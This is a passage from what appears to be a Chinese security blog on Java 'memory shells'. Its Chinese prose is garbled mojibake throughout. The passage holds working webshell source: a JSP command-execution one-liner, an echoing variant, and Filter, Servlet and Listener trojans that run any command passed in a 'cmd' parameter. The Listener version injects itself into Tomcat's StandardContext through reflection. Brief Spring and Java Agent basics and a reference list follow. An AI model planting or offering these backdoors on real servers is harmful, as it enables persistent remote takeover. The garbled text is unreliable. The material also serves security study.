ä»€ä¹ˆæ˜¯ JSPï¼š</h3><p>JSPï¼ˆJava Server Pagesï¼‰ï¼Œæ˜¯Javaçš„ä¸€ç§åŠ¨æ€ç½‘é¡µæŠ€æœ¯ã€‚åœ¨æ—©æœŸJavaçš„å¼€å‘æŠ€æœ¯ä¸­ï¼ŒJavaç¨‹åºå‘˜å¦‚æœæƒ³è¦å‘æµè§ˆå™¨è¾“å‡ºä¸€äº›æ•°æ®ï¼Œå°±å¿…é¡»å¾—æ‰‹åŠ¨<code>println</code>ä¸€è¡Œè¡Œçš„HTMLä»£ç ã€‚ä¸ºäº†è§£å†³è¿™ä¸€ç¹ççš„é—®é¢˜ï¼ŒJavaå¼€å‘äº†JSPæŠ€æœ¯ã€‚</p><p>JSPå¯ä»¥çœ‹ä½œä¸€ä¸ªJava Servletï¼Œä¸»è¦ç”¨äºå®ç°Java webåº”ç”¨ç¨‹åºçš„ç”¨æˆ·ç•Œé¢éƒ¨åˆ†ã€‚ç½‘é¡µå¼€å‘è€…ä»¬é€šè¿‡ç»“åˆHTMLä»£ç ã€XHTMLä»£ç ã€XMLå…ƒç´ ä»¥åŠåµŒå…¥JSPæ“ä½œå’Œå‘½ä»¤æ¥ç¼–å†™JSPã€‚</p><p>å½“ç¬¬ä¸€æ¬¡è®¿é—®JSPé¡µé¢æ—¶ï¼ŒTomcatæœåŠ¡å™¨ä¼šå°†JSPé¡µé¢ç¿»è¯‘æˆä¸€ä¸ªjavaæ–‡ä»¶ï¼Œå¹¶å°†å…¶ç¼–è¯‘ä¸º.classæ–‡ä»¶ã€‚JSPé€šè¿‡ç½‘é¡µè¡¨å•è·å–ç”¨æˆ·è¾“å…¥æ•°æ®ã€è®¿é—®æ•°æ®åº“åŠå…¶ä»–æ•°æ®æºï¼Œç„¶ååŠ¨æ€åœ°åˆ›å»ºç½‘é¡µã€‚</p><h3 id="4-2-æ¶æ„ç±»ï¼š"><a href="#4-2-æ¶æ„ç±»ï¼š" class="headerlink" title="4.2 æ¶æ„ç±»ï¼š"></a>4.2 æ¶æ„ç±»ï¼š</h3><h4 id="JSP-çš„æ— å›æ˜¾çš„å†…å­˜é©¬ï¼š"><a href="#JSP-çš„æ— å›æ˜¾çš„å†…å­˜é©¬ï¼š" class="headerlink" title="JSP çš„æ— å›æ˜¾çš„å†…å­˜é©¬ï¼š"></a><font style="color:rgb(80, 80, 92);">JSP çš„æ— å›æ˜¾çš„å†…å­˜é©¬ï¼š</font></h4><p>æœ€ç®€å•çš„ JSP å‘½ä»¤æ‰§è¡Œåé—¨ï¼Œä½†æ˜¯å‘½ä»¤æ‰§è¡Œçš„è¾“å‡ºæµï¼ˆInputStreamï¼‰æœªè¢«è¯»å–æˆ–å†™å› HTTP å“åº”æ‰€ä»¥æ— å›æ˜¾ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;% Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>));%&gt;<br></code></pre></td></tr></table></figure><p>æ”¹è¿›ä¸ºå¸¦å›æ˜¾ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%<br><span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br><span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();<br>    <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>    out.println(output);<br>&#125;<br>%&gt;<br></code></pre></td></tr></table></figure><h4 id="æœ‰å›æ˜¾çš„-Filter-æœ¨é©¬ï¼š"><a href="#æœ‰å›æ˜¾çš„-Filter-æœ¨é©¬ï¼š" class="headerlink" title="æœ‰å›æ˜¾çš„ Filter æœ¨é©¬ï¼š"></a><font style="color:rgb(80, 80, 92);">æœ‰å›æ˜¾çš„ Filter æœ¨é©¬ï¼š</font></h4><p><font style="color:rgb(80, 80, 92);"></font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br>  <br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShellFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) request;<br>            <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">resp</span> <span class="hljs-operator">=</span> (HttpServletResponse) response;<br>            <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">osTyp</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);<br>                <span class="hljs-keyword">if</span> (osTyp != <span class="hljs-literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                    isLinux = <span class="hljs-literal">false</span>;<br>                &#125;<br>                String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)&#125;;<br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();<br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>                resp.getWriter().write(output);<br>                resp.getWriter().flush();<br>            &#125;<br>            chain.doFilter(request, response);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>        &#125;<br><br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><h4 id="æœ‰å›æ˜¾çš„-Servlet-æœ¨é©¬ï¼š"><a href="#æœ‰å›æ˜¾çš„-Servlet-æœ¨é©¬ï¼š" class="headerlink" title="æœ‰å›æ˜¾çš„ Servlet æœ¨é©¬ï¼š"></a>æœ‰å›æ˜¾çš„ Servlet æœ¨é©¬ï¼š</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt;<br><br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MemServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>        <span class="hljs-keyword">private</span> String message;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>            message = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// è®¡ç®—æœºå¼¹å‡º</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br><br>        <span class="hljs-comment">// MemShell?cmd=whoami  ä»»æ„å‘½ä»¤æ‰§è¡Œ</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br><br>                    <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd);<br>                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> process.getInputStream();<br>                    <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(inputStream));<br>                    String line;<br>                    <span class="hljs-keyword">while</span> ((line = bufferedReader.readLine()) != <span class="hljs-literal">null</span>)&#123;<br>                        res.getWriter().println(line);<br>                    &#125;<br>                &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                    e.printStackTrace();<br>                &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><h4 id="æ— å›æ˜¾çš„-Listener-æœ¨é©¬ï¼š"><a href="#æ— å›æ˜¾çš„-Listener-æœ¨é©¬ï¼š" class="headerlink" title="æ— å›æ˜¾çš„ Listener æœ¨é©¬ï¼š"></a>æ— å›æ˜¾çš„ Listener æœ¨é©¬ï¼š</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%--<br>  Created by IntelliJ IDEA.<br>  User: XVSHIFU<br>  Date: <span class="hljs-number">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2</span><br>  Time: <span class="hljs-number">16</span>:<span class="hljs-number">24</span><br>  To change <span class="hljs-built_in">this</span> template use File | Settings | File Templates.<br>--%&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShellListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>         &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span>&#123;<br>        &#125;<br>    &#125;<br>%&gt;<br><br>&lt;%<br>    <span class="hljs-comment">// 1. è·å– StandardContext ç±»</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br><br>    <span class="hljs-comment">// 2. æ·»åŠ ç›‘å¬å™¨</span><br>    <span class="hljs-type">ShellListener</span> <span class="hljs-variable">shellListener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShellListener</span>();<br>    context.addApplicationEventListener(shellListener);<br>%&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h2 id="5-Spring-åŸºç¡€"><a href="#5-Spring-åŸºç¡€" class="headerlink" title="5. Spring åŸºç¡€"></a>5. Spring åŸºç¡€</h2><p><font style="background-color:#FBDE28;">æ€»ç»“ä¸€å¥è¯ï¼šSpringå°±æ˜¯ä¸€ä¸ªè½»é‡çº§çš„æ§åˆ¶åè½¬ï¼ˆIOCï¼‰å’Œé¢å‘åˆ‡é¢ç¼–ç¨‹ï¼ˆAOPï¼‰çš„æ¡†æ¶</font></p><h3 id="5-1-ä»€ä¹ˆæ˜¯Spring"><a href="#5-1-ä»€ä¹ˆæ˜¯Spring" class="headerlink" title="5.1 ä»€ä¹ˆæ˜¯Spring"></a>5.1 ä»€ä¹ˆæ˜¯Spring</h3><p>Springæ˜¯ä¸€ä¸ªè½»é‡çº§çš„Javaå¼€æºæ¡†æ¶ï¼Œç”¨äºé…ç½®ã€ç®¡ç†å’Œç»´æŠ¤Beanï¼ˆç»„ä»¶ï¼‰çš„ä¸€ç§æ¡†æ¶ï¼Œå…¶æ ¸å¿ƒç†å¿µå°±æ˜¯<strong>IoC(Inversion of Control,æ§åˆ¶åè½¬)</strong> å’Œ <strong>AOP(AspectOrientedProgrammingï¼Œ é¢å‘åˆ‡é¢ç¼–ç¨‹)</strong>ã€‚ç°å¦‚ä»ŠSpringå…¨å®¶æ¡¶å·²æ˜¯ä¸€ä¸ªåºå¤§çš„å®¶æ—</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509336.webp"></p><p>Springçš„å‡ºç°å¤§å¤§ç®€åŒ–äº†JavaEEçš„å¼€å‘æµç¨‹ï¼Œå‡å°‘äº†Javaå¼€å‘æ—¶å„ç§ç¹ççš„é…ç½®ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508481.webp"></p><p>Springæ¡†æ¶çš„æ ¸å¿ƒä¹‹ä¸€å°±æ˜¯åˆ†å±‚ï¼Œå…¶ç”±è®¸å¤šå¤§å¤§å°å°çš„ç»„ä»¶æ„æˆï¼Œæ¯ç§ç»„ä»¶éƒ½å®ç°ä¸åŒåŠŸèƒ½ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509118.webp"></p><h3 id="5-2-SpringBoot"><a href="#5-2-SpringBoot" class="headerlink" title="5.2 SpringBoot"></a>5.2 SpringBoot</h3><p><font style="color:rgba(0, 0, 0, 0.9);">Spring Boot åŸºäº Spring å¼€å‘ï¼ŒSpirng Boot æœ¬èº«å¹¶ä¸æä¾› Spring æ¡†æ¶çš„æ ¸å¿ƒç‰¹æ€§ä»¥åŠæ‰©å±•åŠŸèƒ½ï¼Œåªæ˜¯ç”¨äºå¿«é€Ÿã€æ•æ·åœ°å¼€å‘æ–°ä¸€ä»£åŸºäº Spring æ¡†æ¶çš„åº”ç”¨ç¨‹åºã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒå¹¶ä¸æ˜¯ç”¨æ¥æ›¿ä»£ Spring çš„è§£å†³æ–¹æ¡ˆï¼Œè€Œæ˜¯å’Œ Spring æ¡†æ¶ç´§å¯†ç»“åˆç”¨äºæå‡ Spring å¼€å‘è€…ä½“éªŒçš„å·¥å…·ã€‚Spring Boot ä»¥</font><strong><font style="color:rgba(0, 0, 0, 0.9);">çº¦å®šå¤§äºé…ç½®çš„æ ¸å¿ƒæ€æƒ³</font></strong><font style="color:rgba(0, 0, 0, 0.9);">ï¼Œé»˜è®¤å¸®æˆ‘ä»¬è¿›è¡Œäº†å¾ˆå¤šè®¾ç½®ï¼Œå¤šæ•° Spring Boot åº”ç”¨åªéœ€è¦å¾ˆå°‘çš„ Spring é…ç½®ã€‚åŒæ—¶å®ƒé›†æˆäº†å¤§é‡å¸¸ç”¨çš„ç¬¬ä¸‰æ–¹åº“é…ç½®ï¼ˆä¾‹å¦‚ Redisã€MongoDBã€Jpaã€RabbitMQã€Quartz ç­‰ç­‰ï¼‰ï¼ŒSpring Boot åº”ç”¨ä¸­è¿™äº›ç¬¬ä¸‰æ–¹åº“å‡ ä¹å¯ä»¥é›¶é…ç½®çš„å¼€ç®±å³ç”¨ã€‚</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">ç®€å•æ¥è¯´å°±æ˜¯SpringBootå…¶å®ä¸æ˜¯ä»€ä¹ˆæ–°çš„æ¡†æ¶ï¼Œå®ƒé»˜è®¤é…ç½®äº†å¾ˆå¤šæ¡†æ¶çš„ä½¿ç”¨æ–¹å¼ï¼Œå°±åƒmavenæ•´åˆäº†æ‰€æœ‰çš„jaråŒ…ï¼Œspring bootæ•´åˆäº†æ‰€æœ‰çš„æ¡†æ¶ ã€‚</font></p><p><strong><font style="color:rgba(0, 0, 0, 0.9);">Spring Bootçš„ä¸»è¦ä¼˜ç‚¹ï¼š</font></strong></p><ul><li><font style="color:rgba(0, 0, 0, 0.9);">ä¸ºæ‰€æœ‰Springå¼€å‘è€…æ›´å¿«çš„å…¥é—¨</font></li><li><strong><font style="color:rgba(0, 0, 0, 0.9);">å¼€ç®±å³ç”¨</font></strong><font style="color:rgba(0, 0, 0, 0.9);">ï¼Œæä¾›å„ç§é»˜è®¤é…ç½®æ¥ç®€åŒ–é¡¹ç›®é…ç½®</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">å†…åµŒå¼å®¹å™¨ç®€åŒ–Webé¡¹ç›®</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">æ²¡æœ‰å†—ä½™ä»£ç ç”Ÿæˆå’ŒXMLé…ç½®çš„è¦æ±‚</font></li></ul><h2 id="6-java-Agent"><a href="#6-java-Agent" class="headerlink" title="6. java Agent"></a>6. java Agent</h2><h3 id="6-1-ä»€ä¹ˆæ˜¯Java-Agentï¼Ÿ"><a href="#6-1-ä»€ä¹ˆæ˜¯Java-Agentï¼Ÿ" class="headerlink" title="6.1 ä»€ä¹ˆæ˜¯Java Agentï¼Ÿ"></a>6.1 ä»€ä¹ˆæ˜¯Java Agentï¼Ÿ</h3><p>Javaæ˜¯ä¸€ç§é™æ€å¼ºç±»å‹è¯­è¨€ï¼Œåœ¨è¿è¡Œä¹‹å‰å¿…é¡»å°†å…¶ç¼–è¯‘æˆ<code>.class</code>å­—èŠ‚ç ï¼Œç„¶åå†äº¤ç»™JVMå¤„ç†è¿è¡Œã€‚Java Agent å°±æ˜¯ä¸€ç§èƒ½åœ¨ä¸å½±å“æ­£å¸¸ç¼–è¯‘çš„å‰æä¸‹ï¼Œä¿®æ”¹Javaå­—èŠ‚ç ï¼Œè¿›è€ŒåŠ¨æ€åœ°ä¿®æ”¹å·²åŠ è½½æˆ–æœªåŠ è½½çš„ç±»ã€å±æ€§å’Œæ–¹æ³•çš„æŠ€æœ¯ã€‚</p><p>å¯¹äºAgentï¼ˆä»£ç†ï¼‰æ¥è®²ï¼Œå…¶å¤§è‡´å¯ä»¥åˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ˜¯åœ¨JVMå¯åŠ¨å‰åŠ è½½çš„<code>premain-Agent</code>ï¼Œå¦ä¸€ç§æ˜¯JVMå¯åŠ¨ä¹‹ååŠ è½½çš„<code>agentmain-Agent</code>ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥å°†å…¶ç†è§£æˆä¸€ç§ç‰¹æ®Šçš„Interceptorï¼ˆæ‹¦æˆªå™¨ï¼‰ï¼Œå¦‚ä¸‹å›¾</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508125.jpeg" alt="premain-Agent"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508271.jpeg" alt="agentmain-Agent"></p><h1 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h1><p><a href="https://www.cnblogs.com/rebeyond/p/9686213.html">ã€åŸåˆ›ã€‘åˆ©ç”¨â€œè¿›ç¨‹æ³¨å…¥â€å®ç°æ— æ–‡ä»¶ä¸æ­»webshell</a></p><p><a href="https://goodapple.top/archives/1355">Javaå®‰å…¨å­¦ä¹ â€”â€”å†…å­˜é©¬ - æ«ã®Blog</a></p><p><a href="http://101.36.122.13:4000/2025/08/06/Spring%E5%86%85%E5%AD%98%E9%A9%AC/#J9TFY">Springå†…å­˜é©¬ | CurlySeanâ€™s Blog</a></p><p><a href="https://y4er.com/posts/javaagent-tomcat-memshell/#%E7%AE%80%E8%BF%B0%E5%86%85%E5%AD%98shell">Java Agentå®ç°ååºåˆ—åŒ–æ³¨å…¥å†…å­˜shell</a></p><p><a href="https://su18.org/post/memory-shell/">JavaWeb å†…å­˜é©¬ä¸€å‘¨ç›®é€šå…³æ”»ç•¥ | ç´ åå…«</a></p><p><a href="https://su18.org/post/memory-shell-2/">JavaWeb å†…å­˜é©¬äºŒå‘¨ç›®é€šå…³æ”»ç•¥ | ç´ åå…«</a></p><p><a href="https://www.4hou.com/posts/zlkq">Shellä¸­çš„å¹½çµç‹è€…â€”JAVAWEB å†…å­˜é©¬ ã€è®¤çŸ¥ç¯‡ã€‘ - å˜¶å¼ RoarTalk â€“ ç½‘ç»œå®‰å…¨è¡Œä¸šç»¼åˆæœåŠ¡å¹³å°,4hou.com</a></p><p><a href="https://www.freebuf.com/articles/web/433972.html">Javaå†…å­˜é©¬â€”â€”Tomcat Valveå‹çš„ä¸‰ç§æ³¨å…¥ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p><a href="https://hilang.cloud/java-%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%88%E5%9B%9B%EF%BC%89%EF%BC%9Aspring-boot-controller-%E5%86%85%E5%AD%98%E9%A9%AC/">Java å†…å­˜é©¬ï¼ˆå››ï¼‰ï¼šSpring Boot Controller å†…å­˜é©¬ | æ¸æ€€çš„åšå®¢</a></p><p><a href="https://stoocea.github.io/post/Spring%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90.html#2-Controller-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">Springå‹å†…å­˜é©¬åˆ†æ</a></p><p><a href="https://www.runoob.com/servlet/servlet-intro.html">Servlet ç®€ä»‹ | èœé¸Ÿæ•™ç¨‹</a></p><p><a href="https://clowsman.github.io/2024/11/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html">Springå†…å­˜é©¬å­¦ä¹ </a></p><p><a href="https://xz.aliyun.com/news/11493">Springå†…å­˜é©¬â€”â€”Controller&#x2F;Interceptoræ„é€ </a></p><p>[åŸºç¡€ç¯‡ - Javassist ä½¿ç”¨æŒ‡å—](<a href="https://changeyourway.github.io/2024/06/07/Java">https://changeyourway.github.io/2024/06/07/Java</a> å®‰å…¨&#x2F;åŸºç¡€ç¯‡-javassistç”¨æ³•æŒ‡å—&#x2F;)</p><p><a href="https://goodapple.top/archives/1145#header-id-20">Javaå®‰å…¨å­¦ä¹ â€”â€”ROMEååºåˆ—åŒ– - æ«ã®Blog</a> ï¼ˆä½¿ç”¨Javassistç¼©çŸ­æ¶æ„classï¼‰</p><p><a href="https://y4er.com/posts/javaagent-tomcat-memshell/">Java Agentå®ç°ååºåˆ—åŒ–æ³¨å…¥å†…å­˜shell</a></p><p><a 